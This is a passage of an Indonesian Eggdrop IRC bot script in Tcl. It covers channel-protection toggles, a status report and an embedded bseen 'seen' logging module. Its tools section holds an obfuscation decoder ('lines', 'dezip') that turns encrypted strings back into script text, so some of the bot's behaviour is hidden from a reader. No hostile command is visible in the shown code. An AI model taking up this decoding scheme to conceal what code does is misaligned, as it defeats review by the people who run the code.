        postp $unick chan \002$konten\002 tidak valid..!!!
      }
    }
}
proc semx_status {chan} {
  set info [channel info $chan]
  set ichan [lindex $info 9]
  set ictcp [lindex $info 10]
  set ijoin [lindex $info 11]
  set ikick [lindex $info 12]
  set ideop [lindex $info 13]
  set inick [lindex $info 14]
  append psnstats "Status : \00302\[\003\[Floods : Line=\00304$ichan\003\] \[Ctcp=\00304$ictcp\003\] \[Join=\00304$ijoin\003\] \[Kick=\00304$ikick\003\] \[Deop=\00304$ideop\003\] \[Nick=\00304$inick\003\]\00302\]\003 \00302\[\003"
  append psnstats "\[4B\]anTime ([getuser "data" XTRA "BANTIME"]) "
  if {[string match "*+ping*" $info]} { append psnstats "\[4P\]ing " }
  if {[string match "*+seen*" $info]} { append psnstats "\[4S\]een " }
  if {[string match "*+wb*" $info]} { append psnstats "\[4W\]b " }
  if {[string match "*+port*" $info]} { append psnstats "p\[4O\]rtCheck " }
  if {[string match "*+guard*" $info]} { append psnstats "\[4G\]uard " }
  if {[string match "*+whois*" $info]} { append psnstats "w\[4H\]ois " }
  if {[string match "*+dns*" $info]} { append psnstats "\[4D\]ns " }
  append psnstats "[semx_notc]"
  puthelp "PRIVMSG $chan :$psnstats\00302\]\003"
}
proc semx_avoice {nick metode konten} {
  if {$metode == "pm"} {
    if {[matchattr $konten v]} { 
      postm $nick $konten sudah ada dalam daftar autovoice..!!!
    } {
      chattr $konten +v
      postm $nick $konten di tambahkan ke daftar autovoice..!!!
    }
  } {
    if {[matchattr $konten v]} { 
      postp $nick $konten sudah ada dalam daftar autovoice..!!!
    } {
      chattr $konten +v
      postp $nick $konten di tambahkan ke daftar autovoice..!!!
    }
  }
}
proc semx_-avoice {nick metode konten} {
  if {$metode == "pm"} {
    if {![matchattr $konten v]} { 
      postm $nick $konten sudah tidak dalam daftar autovoice..!!!
    } {
      chattr $konten -v
      postm $nick $konten dihapus dari daftar autovoice..!!!
    }
  } {
    if {![matchattr $konten v]} { 
      postp $nick $konten sudah tidak dalam daftar autovoice..!!!
    } {
      chattr $konten -v
      postp $nick $konten dihapus dari daftar autovoice..!!!
    }
  }
}
proc semx_+whois {unick chan metode konten} {
  if {$metode == "pp"} {
    if {$konten == ""} {
      channel set $chan +whois
      postp $unick \002whois\002 aktif..!!!
      savechan
      } {
      if {[validchan $konten]} {
        channel set $konten +whois
        postp $unick \002whois\002 aktif di chan \002$konten\002..!!!
        savechan
        } {
        postp $unick chan \002$konten\002 tidak valid..!!!
      }
    }
  } elseif {$metode == "pm"} {
    if {[validchan $konten]} {
      channel set $konten +whois
      postm $unick \002whois\002 aktif di chan \002$konten\002
      savechan
      } {
      postm $unick chan \002$konten\002 tidak valid..!!!
    }
    } {
    return 0
  }
}
proc semx_-whois {unick chan metode konten} {
  if {$metode == "pp"} {
    if {$konten == ""} {
      channel set $chan -whois
      postp $unick \002whois\002 dimatikan..!!!
      savechan
      } {
      if {[validchan $konten]} {
        channel set $konten -whois
        postp $unick \002whois\002 dimatikan di chan \002$konten\002..!!!
        savechan
        } {
        postp $unick chan \002$konten\002 tidak valid..!!!
      }
    }
  } elseif {$metode == "pm"} {
    if {[validchan $konten]} {
      channel set $konten -whois
      postm $unick \002whois\002 dimatikan di chan \002$konten\002
      savechan
      } {
      postm $unick chan \002$konten\002 tidak valid..!!!
    }
    } {
    return 0
  }
}
proc semx_+dns {unick chan metode konten} {
  if {$metode == "pp"} {
    if {$konten == ""} {
      channel set $chan +dns
      postp $unick \002dns\002 diaktifkan..!!!
      savechan
      } {
      if {[validchan $konten]} {
        channel set $konten +dns
        postp $unick \002dns\002 diaktifkan di chan \002$konten\002..!!!
        savechan
        } {
        postp $unick chan \002$konten\002 tidak valid..!!!
      }
    }
  } elseif {$metode == "pm"} {
    if {[validchan $konten]} {
      channel set $konten +dns
      postm $unick \002dns\002 diaktifkan di chan \002$konten\002
      savechan
      } {
      postm $unick chan \002$konten\002 tidak valid..!!!
    }
    } {
    return 0
  }
}
proc semx_-dns {unick chan metode konten} {
  if {$metode == "pp"} {
    if {$konten == ""} {
      channel set $chan -dns
      postp $unick \002dns\002 dimatikan..!!!
      savechan
      } {
      if {[validchan $konten]} {
        channel set $konten -dns
        postp $unick \002dns\002 dimatikan di chan \002$konten\002..!!!
        savechan
        } {
        postp $unick chan \002$konten\002 tidak valid..!!!
      }
    }
  } elseif {$metode == "pm"} {
    if {[validchan $konten]} {
      channel set $konten -dns
      postm $unick \002dns\002 dimatikan di chan \002$konten\002
      savechan
      } {
      postm $unick chan \002$konten\002 tidak valid..!!!
    }
    } {
    return 0
  }
}
######################################
#    command publik proc sections end
######################################
######################################
#    tools sections
######################################
proc lines {txt} {
  global lenc ldec uenc udec
  set retval ""
  set count [string length $txt]
  set status 0
  set lst ""
  for {set i 0} {$i < $count} {incr i} {
    set idx [string index $txt $i] 
    if {$idx == "$" && $status == 0} { 
      set status 1
      set idx "~$idx"
    }
    if {$idx == [decrypt 64 "uAwNV.ZfVQk."] && $lst != [decrypt 64 "59.TI0HteTn1"] && $status == 0} {
      set status 2
      set idx "~$idx"
    }
    if {$idx == " " && $status == 1} {
      set status 0
      set idx "$idx~"
    }
    if {$idx == "]" && $status == 2} {
      set status 0
      set idx "$idx~"
    }
    if {$status == 0} {
      if {[string match *$idx* $lenc]} {
        set idx [string range $ldec [string first $idx $lenc] [string first $idx $lenc]]
      }
      if {[string match *$idx* $uenc]} {
        set idx [string range $udec [string first $idx $uenc] [string first $idx $uenc]]
      }
    }
    set lst $idx
    append retval $idx
  }
  regsub -all -- vmw] $retval "end]" retval
  return $retval
}
proc unsix {txt} {
  set retval $txt
  regsub ~ $retval "" retval
  return $retval
}
proc dezip32 {txt} {
  return [decrypt 32 [unsix $txt]]
}
proc dezip {txt} {
  return [decrypt 64 [unsix $txt]]
}
proc zip32 {txt} {
  return [encrypt 32 [unsix $txt]]
}
proc zip {txt} {
  return [encrypt 64 [unsix $txt]]
}
######################################
#    tools sections end
######################################
######################################
#    seen sections
######################################
set bs(limit) 90000
set bs(nicksize) 20
set bs(no_pub) ""
set bs(no_log) ""
set bs(log_only) ""
set bs(cmdchar) "!"
set bs(flood) 4:15
set bs(notice) 1
set bs(ignore) 1
set bs(ignore_time) 2
set bs(smartsearch) 1
set bs(logqueries) 1
set bs(path) ""
proc semxseen {} {
  return "01([vrandom]s01)e14e15n"
}
proc bs_filt {data} {
  regsub -all -- \\\\ $data \\\\\\\\ data ; regsub -all -- \\\[ $data \\\\\[ data ; regsub -all -- \\\] $data \\\\\] data
  regsub -all -- \\\} $data \\\\\} data ; regsub -all -- \\\{ $data \\\\\{ data ; regsub -all -- \\\" $data \\\\\" data ; return $data
}
proc bs_flood_init {} {
  global bs bs_flood_array ; if {![string match *:* $bs(flood)]} { return }
  set bs(flood_num) [lindex [split $bs(flood) :] 0] ; set bs(flood_time) [lindex [split $bs(flood) :] 1] ; set i [expr $bs(flood_num) - 1]
  while {$i >= 0} {set bs_flood_array($i) 0 ; incr i -1 ; }
  } ; bs_flood_init
  proc bs_flood {nick uhost} {
    global bs bs_flood_array ; if {$bs(flood_num) == 0} {return 0} ; set i [expr $bs(flood_num) - 1]
    while {$i >= 1} {set bs_flood_array($i) $bs_flood_array([expr $i - 1]) ; incr i -1} ; set bs_flood_array(0) [unixtime]
    if {[expr [unixtime] - $bs_flood_array([expr $bs(flood_num) - 1])] <= $bs(flood_time)} {
      if {$bs(ignore)} {newignore [join [maskhost *!*[string trimleft $uhost ~]]] $bs(version) flood $bs(ignore_time)} ; return 1
      } {return 0}
    }
if {[lsearch -exact [bind time -|- "*2 * * * *"] bs_timedsave] > -1} {unbind time -|- "*2 * * * *" bs_timedsave} ; #backup frequency can be lower
proc bs_read {} {
  global bs_list userfile bs
  if {![string match */* $userfile]} {set name [lindex [split $userfile .] 0]} {
    set temp [split $userfile /] ; set temp [lindex $temp [expr [llength $temp]-1]] ; set name [lindex [split $temp .] 0]
  }
  if {![file exists $bs(path)bs_data.$name]} {
    if {![file exists $bs(path)bs_data.$name.bak]} { return } {exec cp $bs(path)bs_data.$name.bak $bs(path)bs_data.$name }
    } ; set fd [open $bs(path)bs_data.$name r]
    set bsu_ver "" ; set break 0
    while {![eof $fd]} {
      set inp [gets $fd] ; if {[eof $fd]} {break} ; if {[string trim $inp " "] == ""} {continue}
      if {[string index $inp 0] == "#"} {set bsu_version [string trimleft $inp #] ; continue}
      if {![info exists bsu_version] || $bsu_version == "" || $bsu_version < $bs(updater)} {
        if {[source scripts/bseen_updater1.4.2.tcl] != "ok"} {set temp 1} {set temp 0}
        if {$temp || [bsu_go] || [bsu_finish]} {
          die "critical error in bseen encountered"
          } ; set break 1 ; break
        }
        set nick [lindex $inp 0] ; set bs_list([string tolower $nick]) $inp
        } ; close $fd
        if {$break} {bs_read} {}
      }
      proc bs_update {} {
        global bs
        bs_save ; bs_read
      }
      set bs(updater) 10402 ; set bs(version) bseen1.4.2c
      if {[info exists bs_list]} {
        if {[info exists bs(oldver)]} {
if {$bs(oldver) < $bs(updater)} {bs_update} ;# old ver found
} {bs_update} ;# pre- 1.4.0
}
set bs(oldver) $bs(updater)
if {![info exists bs_list] || [array size bs_list] == 0} { bs_read }
bind time - "12 * * * *" bs_timedsave
proc bs_timedsave {min b c d e} {bs_save}
proc bs_save {} {
  global bs_list userfile bs ; if {[array size bs_list] == 0} {return}
  if {![string match */* $userfile]} {set name [lindex [split $userfile .] 0]} {
    set temp [split $userfile /] ; set temp [lindex $temp [expr [llength $temp]-1]] ; set name [lindex [split $temp .] 0]
  }
  if {[file exists $bs(path)bs_data.$name]} {catch {exec cp -f $bs(path)bs_data.$name $bs(path)bs_data.$name.bak}}
  set fd [open $bs(path)bs_data.$name w] ; set id [array startsearch bs_list] ; putlog "Backing up seen data..."
  puts $fd "#$bs(updater)"
  while {[array anymore bs_list $id]} {set item [array nextelement bs_list $id] ; puts $fd "$bs_list($item)"} ; array donesearch bs_list $id ; close $fd
}
if {[string trimleft [lindex $version 1] 0] >= 1050000} {
  bind part -|- * bs_part  
  } {
    if {[lsearch -exact [bind part -|- *] bs_part] > -1} {unbind part -|- * bs_part}
    bind part -|- * bs_part_oldver
  }
  proc bs_part_oldver {a b c d} {bs_part $a $b $c $d ""}
  proc bs_part {nick uhost hand chan reason} {bs_add $nick "[list $uhost] [unixtime] part $chan [split $reason]"}
  bind join -|- * bs_join
  proc bs_join {nick uhost hand chan} {bs_add $nick "[list $uhost] [unixtime] join $chan"}
  bind sign -|- * bs_sign
  proc bs_sign {nick uhost hand chan reason} {bs_add $nick "[list $uhost] [unixtime] quit $chan [split $reason]"}
  bind kick -|- * bs_kick
  proc bs_kick {nick uhost hand chan knick reason} {bs_add $knick "[getchanhost $knick $chan] [unixtime] kick $chan [list $nick] [list $reason]"}
  bind nick -|- * bs_nick
  proc bs_nick {nick uhost hand chan newnick} {set time [unixtime] ; bs_add $nick "[list $uhost] [expr $time -1] nick $chan [list $newnick]" ; bs_add $newnick "[list $uhost] $time rnck $chan [list $nick]"}
  bind splt -|- * bs_splt
  proc bs_splt {nick uhost hand chan} {bs_add $nick "[list $uhost] [unixtime] splt $chan"}
  bind rejn -|- * bs_rejn
  proc bs_rejn {nick uhost hand chan} {bs_add $nick "[list $uhost] [unixtime] rejn $chan"}
  bind chon -|- * bs_chon
  proc bs_chon {hand idx} {foreach item [dcclist] {if {[lindex $item 3] != "CHAT"} {continue} ; if {[lindex $item 0] == $idx} {bs_add $hand "[lindex $item 2] [unixtime] chon" ; break}}}
if {[lsearch -exact [bind chof -|- *] bs_chof] > -1} {unbind chof -|- * bs_chof} ; #this bind isn't needed any more
bind chjn -|- * bs_chjn
proc bs_chjn {bot hand channum flag sock from} {bs_add $hand "[string trimleft $from ~] [unixtime] chjn $bot"}
bind chpt -|- * bs_chpt
proc bs_chpt {bot hand args} {set old [split [bs_search ? [string tolower $hand]]] ; if {$old != "0"} {bs_add $hand "[join [string trim [lindex $old 1] ()]] [unixtime] chpt $bot"}}

if {[string trimleft [lindex $version 1] 0] > 1030000} {bind away -|- * bs_away}
proc bs_away {bot idx msg} {
  global botnet-nick
  if {$bot == ${botnet-nick}} {set hand [idx2hand $idx]} {return}
  set old [split [bs_search ? [string tolower $hand]]]
  if {$old != "0"} {bs_add $hand "[join [string trim [lindex $old 1] ()]] [unixtime] away $bot [bs_filt [join $msg]]"}
}
bind dcc n|- unseen bs_unseen
proc bs_unseen {hand idx args} {
  global bs_list
  set tot 0 ; set chan [string tolower [lindex $args 0]] ; set id [array startsearch bs_list]
  while {[array anymore bs_list $id]} {
    set item [array nextelement bs_list $id]
    if {$chan == [string tolower [lindex $bs_list($item) 4]]} {incr tot ; lappend remlist $item}
  }
  array donesearch bs_list $id ; if {$tot > 0} {foreach item $remlist {unset bs_list($item)}}
  putidx $idx "$chan successfully removed.  $tot entries deleted from the bseen database."
}
bind bot -|- bs_botsearch bs_botsearch
proc bs_botsearch {from cmd args} {
  global botnick ; set args [join $args]
  set command [lindex $args 0] ; set target [lindex $args 1] ; set nick [lindex $args 2] ; set search [bs_filt [join [lrange $args 3 e]]]
  if {[string match *\\\** $search]} {
    set output [bs_seenmask bot $nick $search]
    if {$output != "No matches were found." && ![string match "I'm not on *" $output]} {putbot $from "bs_botsearch_reply $command \{$target\} {$nick, $botnick says:  [bs_filt $output]}"}
    } {
      set output [bs_output bot $nick [bs_filt [lindex $search 0]] 0]
      if {$output != 0 && [lrange [split $output] 1 4] != "I don't remember seeing"} {putbot $from "bs_botsearch_reply $command \{$target\} {$nick, $botnick says:  [bs_filt $output]}"}
    }
  }
  if {[info exists bs(bot_delay)]} {unset bs(bot_delay)}
  bind bot -|- bs_botsearch_reply bs_botsearch_reply
  proc bs_botsearch_reply {from cmd args} {
    global bs ; set args [join $args]
    if {[lindex [lindex $args 2] 5] == "not" || [lindex [lindex $args 2] 4] == "not"} {return}
    if {![info exists bs(bot_delay)]} {
      set bs(bot_delay) on ; utimer 10 {if {[info exists bs(bot_delay)]} {unset bs(bot_delay)}} 
      if {![lindex $args 0]} {putdcc [lindex $args 1] "[join [lindex $args 2]]"} {puthelp "[lindex $args 1] :[join [lindex $args 2]]"}
    }
  }
  bind dcc -|- seen bs_dccreq1
  bind dcc -|- seennick bs_dccreq2
  proc bs_dccreq1 {hand idx args} {bs_dccreq $hand $idx $args 0}
  proc bs_dccreq2 {hand idx args} {bs_dccreq $hand $idx $args 1}
  proc bs_dccreq {hand idx args no} {
    set args [bs_filt [join $args]] ; global bs
    if {[string match *\\\** [lindex $args 0]]} {
      set output [bs_seenmask dcc $hand $args]
      if {$output == "No matches were found."} {putallbots "bs_botsearch 0 $idx $hand $args"}
      if {[string match "I'm not on *" $output]} {putallbots "bs_botsearch 0 $idx $hand $args"}
      putdcc $idx $output ; return $bs(logqueries)
    }
    set search [bs_filt [lindex $args 0]]
    set output [bs_output dcc $hand $search $no]
    if {$output == 0} {return 0}
    if {[lrange [split $output] 1 4] == "I don't remember seeing"} {putallbots "bs_botsearch 0 $idx $hand $args"}
    putdcc $idx "$output" ; return $bs(logqueries)
  }
  bind msg -|- seen bs_msgreq1
  bind msg -|- seennick bs_msgreq2
  proc bs_msgreq1 {nick uhost hand args} {bs_msgreq $nick $uhost $hand $args 0}
  proc bs_msgreq2 {nick uhost hand args} {bs_msgreq $nick $uhost $hand $args 1}
  proc bs_msgreq {nick uhost hand args no} { 
    if {[bs_flood $nick $uhost]} {return 0} ; global bs
    set args [bs_filt [join $args]]
    if {[string match *\\\** [lindex $args 0]]} {
      set output [bs_seenmask msg $nick $args] 
      if {$output == "No matches were found."} {putallbots "bs_botsearch 1 \{notice $nick\} $nick $args"}
      if {[string match "I'm not on *" $output]} {putallbots "bs_botsearch 1 \{notice $nick\} $nick $args"}
      puthelp "notice $nick :[semxseen] $output" ; return $bs(logqueries)
    }
    set search [bs_filt [lindex $args 0]]
    set output [bs_output $search $nick $search $no]
    if {$output == 0} {return 0}
    if {[lrange [split $output] 1 4] == "I don't remember seeing"} {putallbots "bs_botsearch 1 \{notice $nick\} $nick $args"}
    puthelp "notice $nick :[semxseen] $output" ; return $bs(logqueries)
  }
  bind pub -|- [string trim $bs(cmdchar)]seen bs_pubreq1
  bind pub -|- [string trim $bs(cmdchar)]seennick bs_pubreq2
  proc bs_pubreq1 {nick uhost hand chan args} {
    if {![channel get $chan seen]} {return 0}
    bs_pubreq $nick $uhost $hand $chan $args 0
  }
  proc bs_pubreq2 {nick uhost hand chan args} {bs_pubreq $nick $uhost $hand $chan $args 1}
  proc bs_pubreq {nick uhost hand chan args no} {
    if {[bs_flood $nick $uhost]} {return 0}
    global botnick bs ; set i 0 
    if {[lsearch -exact $bs(no_pub) [string tolower $chan]] >= 0} {return 0}
    if {$bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower $chan]] == -1} {return 0}
    set args [bs_filt [join $args]]
    if {$bs(notice) == 1} {set target "notice $nick"} {set target "privmsg $chan"}
    if {[string match *\\\** [lindex $args 0]]} {
      set output [bs_seenmask $chan $hand $args]
      if {$output == "No matches were found."} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
      if {[string match "I'm not on *" $output]} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
      puthelp "$target :[semxseen] $output" ; return $bs(logqueries)
    }
    set data [bs_filt [string trimright [lindex $args 0] ?!.,]]
    if {[string tolower $nick] == [string tolower $data] } {puthelp "$target :[semxseen] $nick, silahkan bercermin..!" ; return $bs(logqueries)}
    if {[string tolower $data] == [string tolower $botnick] } {puthelp "$target :[semxseen] $nick, disini..!!!" ; return $bs(logqueries)}
    if {[onchan $data $chan]} {puthelp "$target :[semxseen] $nick, $data ada disini..!" ; return $bs(logqueries)}
    set output [bs_output $chan $nick $data $no] ; if {$output == 0} {return 0}
    if {[lrange [split $output] 1 4] == "Aku tidak ingat"} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
    puthelp "$target :[semxseen] $output" ; return $bs(logqueries)
  }
proc bs_output {chan nick data no} {
  global botnick bs version bs_list
  set data [string tolower [string trimright [lindex $data 0] ?!.,]]
  if {$data == ""} {return 0}
  if {[string tolower $nick] == $data} {return [concat $nick, kamu ada disini bukan..???.]}
  if {$data == [string tolower $botnick]} {return [concat $nick, saya ada disini..!!!]}
  if {[string length $data] > $bs(nicksize)} {return 0} 
  if {$bs(smartsearch) != 1} {set no 1}
  if {$no == 0} {
    set matches "" ; set hand "" ; set addy ""
    if {[lsearch -exact [array names bs_list] $data] != "-1"} { 
      set addy [lindex $bs_list([string tolower $data]) 1] ; set hand [finduser $addy]
      foreach item [bs_seenmask dcc ? [maskhost $addy]] {if {[lsearch -exact $matches $item] == -1} {set matches "$matches $item"}}
    }
    if {[validuser $data]} {set hand $data}
    if {$hand != "*" && $hand != ""} {
      if {[string trimleft [lindex $version 1] 0]>1030000} {set hosts [getuser $hand hosts]} {set hosts [gethosts $hand]}
      foreach addr $hosts {
        foreach item [string tolower [bs_seenmask dcc ? $addr]] {
          if {[lsearch -exact [string tolower $matches] [string tolower $item]] == -1} {set matches [concat $matches $item]}
        }
      }
    }
    if {$matches != ""} {
      set matches [string trimleft $matches " "]
      set len [llength $matches]
      if {$len == 1} {return [bs_search $chan [lindex $matches 0]]}
      if {$len > 99} {return [concat Ada $len yang cocok di database, tolong sebutkan mana yang mau dicari.]}
      set matches [bs_sort $matches]
      set key [lindex $matches 0]
      if {[string tolower $key] == [string tolower $data]} {return [bs_search $chan $key]}
      if {$len <= 5} {
        set output [ concat Ada $len user yang cocok (sorted): [join $matches].]
        set output [concat $output  [bs_search $chan $key]] ; return $output
        } {
          set output [ concat Ada $len user yang cocok. Ini 5 user yang terakhir (sorted): [join [lrange $matches 0 4]].]
          set output [concat $output  [bs_search $chan $key]] ; return $output
        }
      }
    }
    set temp [bs_search $chan $data]
    if {$temp != 0} { return $temp } {
      if {![validuser [bs_filt $data]] || [string trimleft [lindex $version 1] 0]<1030000} { 
        return " $nick, Saya tidak pernah lihat $data."
        } {
          set seen [getuser $data laston]
          if {[getuser $data laston] == ""} {return "$nick, Saya tidak pernah melihat $data."}
          if {($chan != [lindex $seen 1] || $chan == "bot" || $chan == "msg" || $chan == "dcc") && [validchan [lindex $seen 1]] && [lindex [channel info [lindex $seen 1]] 23] == "+secret"} {
            set chan "-secret-"
            } {
              set chan [lindex $seen 1]
            }
            return [concat $nick, $data terakhir saya lihat masih berada di $chan [bs_when [lindex $seen 0]] yang lalu.]
          }
        }
      }
proc bs_search {chan n} {
  global bs_list ; if {![info exists bs_list]} {return 0}
  if {[lsearch -exact [array names bs_list] [string tolower $n]] != "-1"} { 
    set data [split $bs_list([string tolower $n])]
    set n [join [lindex $data 0]] ; set addy [lindex $data 1] ; set time [lindex $data 2] ; set marker 0
    if {([string tolower $chan] != [string tolower [lindex $data 4]] || $chan == "dcc" || $chan == "msg" || $chan == "bot") && [validchan [lindex $data 4]] && [lindex [channel info [lindex $data 4]] 23] == "+secret"} {
      set chan "-secret-"
      } {
        set chan [lindex $data 4]
      }
      switch -- [lindex $data 3] {
        part { 
          set reason [lrange $data 5 e]
          if {$reason == ""} {set reason "."} {set reason " Pesan : \"$reason\"."}
          set output [concat $n ($addy) terakhir saya lihat dia meninggalkan $chan [bs_when $time] yang lalu $reason] 
        }
        quit { set output [concat $n ($addy) terakhir saya lihat dia keluar IRC dari $chan [bs_when $time] yang lalu. Pesan : ([join [lrange $data 5 e]]).] }
        kick { set output [concat $n ($addy) terakhir saya lihat dia ditendang dari $chan oleh [lindex $data 5] [bs_when $time] yang lalu dengan pesan ([join [lrange $data 6 e]]).] }
        rnck {
          set output [concat $n ($addy) terakhir saya lihat dia ganti nick dari [lindex $data 5] di [lindex $data 4] [bs_when $time] yang lalu.] 
          if {[validchan [lindex $data 4]]} {
            if {[onchan $n [lindex $data 4]]} {
              set output [concat $output $n masih ada di chan ini.]
              } {
                set output [concat $output sekarang saya tidak melihat $n lagi.]
              }
            }
          }
          nick { 
            set output [concat $n ($addy) terakhir saya lihat dia ganti nick [lindex $data 5] di [lindex $data 4] [bs_when $time] yang lalu.] 
          }
          splt { set output [concat $n ($addy) terakhir saya lihat dia meninggalkan $chan karena split server [bs_when $time] yang lalu.] }
          rejn { 
            set output [concat $n ($addy) terakhir saya lihat dia join $chan setelah terkena split server [bs_when $time] yang lalu.] 
            if {[validchan $chan]} {if {[onchan $n $chan]} {set output [concat $output  $n masih ada di $chan.]} {set output [concat $output saya tidak lihat $n di $chan sekarang.]}}
          }
          join { 
            set output [concat $n ($addy) terakhir saya lihat dia join $chan [bs_when $time] yang lalu.]
            if {[validchan $chan]} {if {[onchan $n $chan]} {set output [concat $output  $n masih ada di $chan.]} {set output [concat $output saya tidak lihat $n di $chan sekarang.]}}
          }
          away {
            set reason [lrange $data 5 e]
            if {$reason == ""} {
              set output [concat $n ($addy) was last seen returning to the partyline on $chan [bs_when $time] ago.]
              } {
                set output [concat $n ($addy) terakhir saya lihat dia away ($reason) di $chan [bs_when $time] yang lalu.]
              }
            }
            chon { 
              set output [concat $n ($addy) was last seen joining the partyline [bs_when $time] ago.] ; set lnick [string tolower $n]
              foreach item [whom *] {if {$lnick == [string tolower [lindex $item 0]]} {set output [concat $output  $n is on the partyline right now.] ; set marker 1 ; break}}
              if {$marker == 0} {set output [concat $output  I don't see $n on the partyline now, though.]}
            }
            chof { 
              set output [concat $n ($addy) was last seen leaving the partyline [bs_when $time] ago.] ; set lnick [string tolower $n]
              foreach item [whom *] {if {$lnick == [string tolower [lindex $item 0]]} {set output [concat $output  $n is on the partyline in [lindex $item 1] still.] ; break}}
            }
            chjn { 
              set output [concat $n ($addy) was last seen joining the partyline on $chan [bs_when $time] ago.] ; set lnick [string tolower $n]
              foreach item [whom *] {if {$lnick == [string tolower [lindex $item 0]]} {set output [concat $output  $n is on the partyline right now.] ; set marker 1 ; break}}
              if {$marker == 0} {set output [concat $output  I don't see $n on the partyline now, though.]}
            }
            chpt { 
              set output [concat $n ($addy) was last seen leaving the partyline from $chan [bs_when $time] ago.] ; set lnick [string tolower $n]
              foreach item [whom *] {if {$lnick == [string tolower [lindex $item 0]]} {set output [concat $output  $n is on the partyline in [lindex $item 1] still.] ; break}}
            }
            default {set output "error"}
            } ; return $output
            } {return 0}
          }
proc bs_when {lasttime} {
  set years 0 ; set days 0 ; set hours 0 ; set mins 0 ; set time [expr [unixtime] - $lasttime]
  if {$time < 60} {return "hanya $time detik"}
  if {$time >= 31536000} {set years [expr int([expr $time/31536000])] ; set time [expr $time - [expr 31536000*$years]]}
  if {$time >= 86400} {set days [expr int([expr $time/86400])] ; set time [expr $time - [expr 86400*$days]]}
  if {$time >= 3600} {set hours [expr int([expr $time/3600])] ; set time [expr $time - [expr 3600*$hours]]}
  if {$time >= 60} {set mins [expr int([expr $time/60])]}
  if {$years == 0} {set output ""} elseif {$years == 1} {set output "1 year,"} {set output "$years years,"}
  if {$days == 1} {lappend output "1 day,"} elseif {$days > 1} {lappend output "$days hari,"}
  if {$hours == 1} {lappend output "1 hour,"} elseif {$hours > 1} {lappend output "$hours jam,"}
  if {$mins == 1} {lappend output "1 minute"} elseif {$mins > 1} {lappend output "$mins menit"}
  return [string trimright [join $output] ", "]
}
proc bs_add {nick data} {
  global bs_list bs
  if {[lsearch -exact $bs(no_log) [string tolower [lindex $data 3]]] >= 0 || ($bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower [lindex $data 3]]] == -1)} {return}
  set bs_list([string tolower $nick]) "[bs_filt $nick] $data"
}
bind time -  "*1 * * * *" bs_trim
proc bs_lsortcmd {a b} {global bs_list ; set a [lindex $bs_list([string tolower $a]) 2] ; set b [lindex $bs_list([string tolower $b]) 2] ; if {$a > $b} {return 1} elseif {$a < $b} {return -1} {return 0}}
proc bs_trim {min h d m y} {
  global bs bs_list ; if {![info exists bs_list] || ![array exists bs_list]} {return} ; set list [array names bs_list] ; set range [expr [llength $list] - $bs(limit) - 1] ; if {$range < 0} {return}
  set list [lsort -increasing -command bs_lsortcmd $list] ; foreach item [lrange $list 0 $range] {unset bs_list($item)}
}
proc bs_seenmask {ch nick args} {
  global bs_list bs ; set matches "" ; set temp "" ; set i 0 ; set args [join $args] ; set chan [lindex $args 1]
  if {$chan != "" && [string trimleft $chan #] != $chan} {
    if {![validchan $chan]} {return "I'm not on $chan."} {set chan [string tolower $chan]}
    } { set $chan "" }
    if {![info exists bs_list]} {return "No matches were found."} ; set data [bs_filt [string tolower [lindex $args 0]]]

    set maskfix 1
    while $maskfix {
      set mark 1
      if [regsub -all -- \\?\\? $data ? data] {set mark 0}
      if [regsub -all -- \\*\\* $data * data] {set mark 0}
      if [regsub -all -- \\*\\? $data * data] {set mark 0}
      if [regsub -all -- \\?\\* $data * data] {set mark 0}
      if $mark {break}
    }

    set id [array startsearch bs_list]
    while {[array anymore bs_list $id]} {
      set item [array nextelement bs_list $id] ; if {$item == ""} {continue} ; set i 0 ; set temp "" ; set match [lindex $bs_list($item) 0] ; set addy [lindex $bs_list($item) 1]
      if {[string match $data $item![string tolower $addy]]} {
        set match [bs_filt $match] ; if {$chan != ""} {
          if {[string match $chan [string tolower [lindex $bs_list($item) 4]]]} {set matches [concat $matches $match]}
          } {set matches [concat $matches $match]}
        }
      }
      array donesearch bs_list $id
      set matches [string trim $matches " "]
      if {$nick == "?"} {return [bs_filt $matches]}
      set len [llength $matches]
      if {$len == 0} {return "No matches were found."}
      if {$len == 1} {return [bs_output $ch $nick $matches 1]}
      if {$len > 99} {return "I found $len matches to your query; please refine it to see any output."}
      set matches [bs_sort $matches]
      if {$len <= 5} {
        set output [concat Ada $len user yang cocok (sorted): [join $matches].]
        } {
          set output "I found $len matches to your query.  Here are the 5 most recent (sorted): [join [lrange $matches 0 4]]."
        }
        return [concat $output [bs_output $ch $nick [lindex [split $matches] 0] 1]]
      } 
      proc bs_sort {data} {global bs_list ; set data [bs_filt [join [lsort -decreasing -command bs_lsortcmd $data]]] ; return $data}
      bind dcc -|- seenstats bs_dccstats
      proc bs_dccstats {hand idx args} {putdcc $idx "[bs_stats]"; return 1}
      bind pub -|- [string trim $bs(cmdchar)]seenstats bs_pubstats
      proc bs_pubstats {nick uhost hand chan args} {
        global bs ; if {[bs_flood $nick $uhost] || [lsearch -exact $bs(no_pub) [string tolower $chan]] >= 0 || ($bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower $chan]] == -1)} {return 0}
        if {$bs(notice) == 1} {set target "notice $nick"} {set target "privmsg $chan"} ; puthelp "$target :[semxseen] [bs_stats]" ; return 1
      }
      bind msg -|- seenstats bs_msgstats
      proc bs_msgstats {nick uhost hand args} {global bs ; if {[bs_flood $nick $uhost]} {return 0} ; puthelp "notice $nick :[semxseen] [bs_stats]" ; return $bs(logqueries)}
      proc bs_stats {} {
        global bs_list bs ; set id [array startsearch bs_list] ; set bs_record [unixtime] ; set totalm 0 ; set temp ""
        while {[array anymore bs_list $id]} {
          set item [array nextelement bs_list $id]
          set tok [lindex $bs_list($item) 2] ; if {$tok == ""} {continue}
          if {[lindex $bs_list($item) 2] < $bs_record} {set bs_record [lindex $bs_list($item) 2] ; set name $item}
          set addy [string tolower [maskhost [lindex $bs_list($item) 1]]] ; if {[lsearch -exact $temp $addy] == -1} {incr totalm ; lappend temp $addy}
        }
        array donesearch bs_list $id
        return "I've recorded [array size bs_list]/$bs(limit) nicks, and been comparing $totalm different hosts. Oldes Database is [lindex $bs_list($name) 0]'s, about [bs_when $bs_record] ago."
      }
      bind dcc -|- chanstats bs_dccchanstats
      proc bs_dccchanstats {hand idx args} {
        if {$args == "{}"} {set args [console $idx]}  
